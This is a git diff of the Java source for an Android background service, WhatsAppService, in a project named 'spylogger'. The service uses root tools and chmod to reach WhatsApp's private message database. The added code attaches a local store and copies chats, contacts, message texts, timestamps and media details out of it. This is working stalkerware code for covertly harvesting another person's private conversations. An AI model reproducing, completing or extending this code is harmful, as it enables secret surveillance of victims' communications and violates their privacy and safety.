@@ -8,33 +8,34 @@ import android.os.FileObserver;
 import android.os.IBinder;
 import android.util.Log;
 
+import com.gravatasufoca.spylogger.dao.DatabaseHelper;
 import com.gravatasufoca.spylogger.dao.whatsapp.DatabaseHelperExternal;
-import com.gravatasufoca.spylogger.dao.whatsapp.DatabaseHelperInternal;
+import com.gravatasufoca.spylogger.model.Mensagem;
+import com.gravatasufoca.spylogger.model.TipoMidia;
+import com.gravatasufoca.spylogger.model.Topico;
 import com.gravatasufoca.spylogger.model.whatsapp.ChatList;
 import com.gravatasufoca.spylogger.model.whatsapp.Messages;
 import com.gravatasufoca.spylogger.utils.Utils;
 import com.j256.ormlite.dao.Dao;
+import com.j256.ormlite.dao.GenericRawResults;
 import com.stericson.RootTools.RootTools;
 import com.stericson.RootTools.execution.CommandCapture;
 
-import java.io.File;
-import java.io.IOException;
-import java.sql.SQLException;
-import java.util.HashSet;
+import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
-import java.util.Set;
 
 public class WhatsAppService extends Service {
 
 	private String pathToWatch;
-	private Dao<Messages, Integer> daoMsgInternal;
-	private Dao<Messages, Integer> daoMsgExternal;
-	private Dao<ChatList, Integer> daoChatInternal;
-	private Dao<ChatList, Integer> daoChatExternal;
-
-	private DatabaseHelperInternal internal;
+	private String inFileName;
 	private DatabaseHelperExternal external;
-    private final IBinder mBinder = new LocalBinder();
+	private Dao<ChatList, Integer> daoChatExternal;
+	private Dao<Messages, Integer> daoMsgExternal;
+
+	private DatabaseHelper dbHelper;
+
+	private final IBinder mBinder = new LocalBinder();
     private boolean loaded=false;
 
     public class LocalBinder extends Binder {
@@ -74,31 +75,9 @@ public class WhatsAppService extends Service {
 
 		chmod();
 		try {
-			String inFileName = getApplicationContext().getPackageManager()
-					.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
-					+ "/databases/msgstore.db";
-
-			File dest = new File(inFileName);
-
-			if (!dest.exists()) {
-
-				File source = new File(pathToWatch);
-				try {
-
-					File dir = new File(
-							getApplicationContext().getPackageManager()
-									.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
-									+ "/databases/");
-					if (!dir.exists())
-						dir.mkdir();
-
-					dest.createNewFile();
-					Utils.copyFile(source, dest);
-				} catch (IOException e) {
-					e.printStackTrace();
-				}
-			}
-
+			inFileName = getApplicationContext().getPackageManager()
+                        .getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
+                        + "/databases/"+ DatabaseHelper.DATABASE_NAME;
 		} catch (NameNotFoundException e) {
 			e.printStackTrace();
 		}
@@ -112,16 +91,56 @@ public class WhatsAppService extends Service {
 
 		Log.d("WHATSLOG - FLAGS", Integer.toString(flags));
 
-		internal = new DatabaseHelperInternal(getApplicationContext());
 		external = new DatabaseHelperExternal(getApplicationContext());
+		dbHelper = new DatabaseHelper((getApplicationContext()));
 
 		try {
-			daoMsgInternal = internal.getMessagesDao();
 			daoMsgExternal = external.getMessagesDao();
-			daoChatInternal = internal.getChatDao();
 			daoChatExternal = external.getChatDao();
 
+			daoMsgExternal.executeRaw("attach database '"+inFileName+"' as 'localdb' ");
+
+
+			GenericRawResults<String[]> raws= daoMsgExternal.queryRaw("select _id,key_remote_jid, subject,creation,sort_timestamp from chat_list where _id!=-1 and _id not in( select idReferencia from localdb.topico )");
+			List<Topico> topicos=new ArrayList<>();
+
+			for(String[] resultRaw:raws){
+				Topico topico=new Topico.TopicoBuilder()
+						.setIdReferencia(resultRaw[0])
+						.setRemoteKey(resultRaw[1])
+						.setNome(resultRaw[2])
+						.setDataCriacao(new Date(Long.parseLong(resultRaw[3])))
+						.setOrdenacao(new Date(Long.parseLong(resultRaw[4]))).build();
+
+				topicos.add(topico);
+			}
+
+			GenericRawResults<String[]> rawResults= daoMsgExternal.queryRaw("select _id,key_remote_jid,key_from_me,data,timestamp,media_wa_type,media_size,remote_resource,received_timestamp, case when raw_data is not null  then 1 else '' end from messages where _id!=-1 and _id not in( select idReferencia from localdb.mensagem )");
+			List<Mensagem> mensagems=new ArrayList<>();
+			for(final String[] resultRaw:rawResults){
+
+				for(Topico topico: topicos) {
+					if(topico.getRemoteKey().equals(resultRaw[1])) {
+						Mensagem mensagem = new Mensagem.MensagemBuilder()
+								.setIdReferencia(resultRaw[0])
+								.setRemoteKey(resultRaw[1])
+								.setRemetente(resultRaw[2] == "1")
+								.setTexto(resultRaw[3])
+								.setData(new Date(Long.parseLong(resultRaw[4])))
+								.setDataRecebida(new Date(Long.parseLong(resultRaw[8])))
+								.setTamanhoArquivo(Long.parseLong(resultRaw[6]))
+								.setTipoMidia(TipoMidia.getTipoMidia(resultRaw[5]))
+								.setContato(resultRaw[7])
+								.setTemMedia(resultRaw[9] == "1").build();
+						mensagems.add(mensagem);
+					}
+				}
+			}
+
+
+
 		} catch (Exception e) {
+			e.printStackTrace();
 		}
 
 		if(Utils.whatsObserver==null)
@@ -159,57 +178,11 @@ public class WhatsAppService extends Service {
 
 	private void updateMsg() {
 
-		try {
-			List<Messages> mensagens = daoMsgInternal.queryForAll();
-			List<Messages> m = daoMsgExternal.queryForAll();
-			Set<Messages> nova = new HashSet<Messages>();
-			for (Messages mensagem : m) {
 
-				if (!mensagens.contains(mensagem)) {
-					nova.add(mensagem);
-				}
-
-			}
-
-			for (Messages mensagem : nova) {
-				try {
-					daoMsgInternal.create(mensagem);
-				} catch (SQLException e) {
-					e.printStackTrace();
-				}
-			}
-
-		} catch (SQLException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		}
 	}
 
 	private void updateChat() {
 
-		try {
-			List<ChatList> chats = daoChatInternal.queryForAll();
-			List<ChatList> m = daoChatExternal.queryForAll();
-			Set<ChatList> nova = new HashSet<ChatList>();
-			for (ChatList chat : m) {
 
-				if (!chats.contains(chat)) {
-					nova.add(chat);
-				}
-
-			}
-
-			for (ChatList chat : nova) {
-				try {
-					daoChatInternal.create(chat);
-				} catch (SQLException e) {
-					e.printStackTrace();
-				}
-			}
-
-		} catch (SQLException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		}
 	}
 }
